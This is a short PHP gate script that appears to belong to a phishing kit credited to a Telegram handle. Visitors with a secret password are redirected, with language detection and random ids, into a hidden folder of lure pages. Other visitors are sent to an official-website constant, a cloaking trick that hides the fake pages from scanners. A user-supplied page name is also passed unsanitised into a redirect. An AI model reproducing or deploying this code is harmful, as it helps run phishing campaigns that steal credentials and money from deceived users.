<?php
    /*******
    Telegram : https://t.me/elgh03t
    ********************************************************/

    require_once 'app/config.php';
    if( $_GET['pwd'] == PASSWORD ) {

        $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
        $acceptLang = ['en', 'de', 'es', 'fr', 'it', 'nl', 'dk', 'cn', 'ar','ro'];
        $lang = in_array($lang, $acceptLang) ? $lang : 'en';
        $_SESSION['lang'] = $lang;
        
        $page = "msg.php";
        header("Location: fV5EjH/" . $page . "?id=" . mt_rand(11111, 99999999));
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $page = $_GET['redirection'] . '.php';
        if( isset($_GET['error']) ) {
            header("Location: fV5EjH/" . $page . "?error=". $_GET['error'] ."&id=" . mt_rand(11111, 99999999));
            exit();
        }
        header("Location: fV5EjH/" . $page . "?id=" . mt_rand(11111, 99999999));
        exit();
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>